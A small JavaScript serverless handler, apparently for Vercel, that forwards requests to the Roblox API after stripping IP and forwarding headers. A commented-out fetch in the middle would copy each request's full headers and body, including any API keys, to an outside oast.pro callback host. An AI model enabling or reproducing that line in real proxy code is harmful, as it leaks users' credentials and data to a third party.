export const runtime = 'edge';

const { Redis } = require("@upstash/redis")

const upstash = new Redis({
    url: process.env.RBLXSTOR_KV_REST_API_URL,
    token: process.env.RBLXSTOR_KV_REST_API_TOKEN,
})

module.exports = async (req, res) => {
 const path = decodeURIComponent(req.url.replace(/^\/proxy/, ''));
    const target = `https://apis.roblox.com${path}`;

    console.log(target)
    
    const headers = { ...req.headers };
    delete headers['content-length'];
    delete headers['transfer-encoding'];
    delete headers['host'];
    delete headers['user-agent'];
    headers['user-agent'] = 'rblx-ds-msgr/@vrcl-prxy';
Object.keys(headers).forEach(key => {
    if (key.startsWith('x-vercel-') || key === 'forwarded' || key === 'x-real-ip' || key === 'x-forwarded-for') {
        delete headers[key];
    }
});

    const body = req.method === 'GET' || req.method === 'HEAD' ? undefined : JSON.stringify(req.body);

    //await fetch('https://fbf5cf896e34a71bd0a3gutmykayyyyyb.oast.pro', {
    //    method: req.method,
    //    headers,
    //    body
    //});

    const response = await fetch(target, {
        method: req.method,
        headers,
        body,
        duplex: 'half'
    });

    res.status(response.status);
    response.headers.forEach((v, k) => res.setHeader(k, v));
    res.send(await response.text());
}
